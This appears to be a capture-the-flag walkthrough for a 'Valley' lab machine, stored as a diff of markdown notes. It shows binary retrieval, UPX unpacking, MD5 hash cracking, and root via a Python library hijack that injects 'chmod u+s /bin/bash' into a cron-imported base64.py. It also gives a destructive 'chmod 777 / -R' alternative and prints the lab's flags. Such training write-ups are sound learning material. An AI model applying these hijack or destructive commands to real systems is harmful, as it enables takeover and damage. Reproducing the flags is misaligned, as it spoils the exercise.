@@ -213,3 +213,219 @@ Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)
 
      https://ubuntu.com/pro
 valleyDev@valley:~$ whoami
+valleyDev
+valleyDev@valley:~$ ls
+user.txt
+valleyDev@valley:~$ cat user.txt 
+THM{k@l1_1n_th3_v@lley}
+
+valleyDev@valley:/home$ ls -la
+total 752
+drwxr-xr-x  5 root      root        4096 Mar  6 13:19 .
+drwxr-xr-x 21 root      root        4096 Mar  6 15:40 ..
+drwxr-x---  4 siemDev   siemDev     4096 Mar 20 20:03 siemDev
+drwxr-x--- 16 valley    valley      4096 Mar 20 20:54 valley
+-rwxrwxr-x  1 valley    valley    749128 Aug 14  2022 valleyAuthenticator
+drwxr-xr-x  5 valleyDev valleyDev   4096 Mar 13 08:17 valleyDev
+
+valleyDev@valley:/home$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.8.19.103 - - [20/Jun/2023 15:23:25] "GET /valleyAuthenticator HTTP/1.1" 200 -
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.97.111:1234/valleyAuthenticator
+--  http://10.10.97.111:1234/valleyAuthenticator
+Connecting to 10.10.97.111:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 749128 (732K) [application/octet-stream]
+Saving to: ‘valleyAuthenticator’
+
+valleyAuthentic 100%[=====>] 731.57K   479KB/s    in 1.5s    
+
+(479 KB/s) - ‘valleyAuthenticator’ saved [749128/749128]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ strings valleyAuthenticator > revisar.txt
+
+e6722920bab2326f8217e4
+bf6b1b58ac
+ddJ1cc76ee3
+beb60709056cfbOW
+elcome to Valley Inc. Authentica
+[k0rHh
+ is your usernad
+Ol: /passwXd.{
+~{edJrong P= 
+sL_striF::_M_M
+v0ida%02xo
+
+or
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ upx -d valleyAuthenticator
+                       Ultimate Packer for eXecutables
+                          Copyright (C) 1996 - 2020
+UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020
+
+        File size         Ratio      Format      Name
+   --------------------   ------   -----------   -----------
+   2285616 <-    749128   32.78%   linux/amd64   valleyAuthenticator
+
+Unpacked 1 file.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ strings valleyAuthenticator | more
+
+e6722920bab2326f8217e4bf6b1b58ac
+dd2921cc76ee3abfd2beb60709056cfb
+
+valleyDev@valley:/home$ ./valleyAuthenticator 
+Welcome to Valley Inc. Authenticator
+What is your username: a
+What is your password: a
+Wrong Password or Username
+
+|Hash|Type|Result|
+|---|---|---|
+|e6722920bab2326f8217e4bf6b1b58ac|md5|liberty123|
+|dd2921cc76ee3abfd2beb60709056cfb|md5|valley|
+
+valleyDev@valley:/home$ ./valleyAuthenticator 
+Welcome to Valley Inc. Authenticator
+What is your username: valley
+What is your password: liberty123
+Authenticated
+
+valleyDev@valley:/home$ su valley
+Password: 
+valley@valley:/home$ id
+uid=1000(valley) gid=1000(valley) groups=1000(valley),1003(valleyAdmin)
+
+valley@valley:/home$ find / -group valleyAdmin -type f  2>/dev/null
+/usr/lib/python3.8/base64.py
+valley@valley:/home$ cat /etc/crontab
+```
+```text
+# /etc/crontab: system-wide crontab
+```
+```text
+# Unlike any other crontab you don't have to run the `crontab'
+```
+```text
+# command to install the new version when you edit this file
+```
+```text
+# and files in /etc/cron.d. These files also have username fields,
+```
+```text
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+```
+```text
+# Example of job definition:
+```
+```text
+# .---------------- minute (0 - 59)
+```
+```text
+# |  .------------- hour (0 - 23)
+```
+```text
+# |  |  .---------- day of month (1 - 31)
+```
+```text
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+```
+```text
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+```
+```text
+# |  |  |  |  |
+```
+```text
+# *  *  *  *  * user-name command to be executed
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+
+valley@valley:/home$ cat /photos/script/photosEncrypt.py
+#!/usr/bin/python3
+import base64
+for i in range(1,7):
+```
+```text
+# specify the path to the image file you want to encode
+	image_path = "/photos/p" + str(i) + ".jpg"
+```
+```text
+# open the image file and read its contents
+	with open(image_path, "rb") as image_file:
+          image_data = image_file.read()
+```
+```text
+# encode the image data in Base64 format
+	encoded_image_data = base64.b64encode(image_data)
+```
+```text
+# specify the path to the output file
+	output_path = "/photos/photoVault/p" + str(i) + ".enc"
+```
+```text
+# write the Base64-encoded image data to the output file
+	with open(output_path, "wb") as output_file:
+    	  output_file.write(encoded_image_data)
+
+valley@valley:/home$ more /usr/lib/python3.8/base64.py
+#! /usr/bin/python3.8
+
+"""Base16, Base32, Base64 (RFC 3548), Base85 and Ascii85 data encodings"""
+```
+```text
+# Modified 04-Oct-1995 by Jack Jansen to use binascii module
+```
+```text
+# Modified 30-Dec-2003 by Barry Warsaw to add full RFC 3548 support
+```
+
+## Privilege Escalation
+```text
+# Modified 22-May-2007 by Guido van Rossum to use bytes everywhere
+
+import re
+import struct
+import binascii
+import os
+
+os.system('chmod u+s /bin/bash')
+
+or
+
+os.system("chmod 777 / -R")
+
+valley@valley:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+
+valley@valley:/home$ python3 /photos/script/photosEncrypt.py
+valley@valley:/photos/photoVault$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# ls
+root.txt  snap
+bash-5.0# cat root.txt 
+THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}
+```
+What is the user flag?
+What is the root flag?
+
+## Flags / Answers
+- ***THM{k@l1_1n_th3_v@lley}***
+- ***THM{v@lley_0f_th3_sh@d0w_0f_pr1v3sc}***
+
+## Notes / Lessons Learned
+[[Intro to Docker]]
+
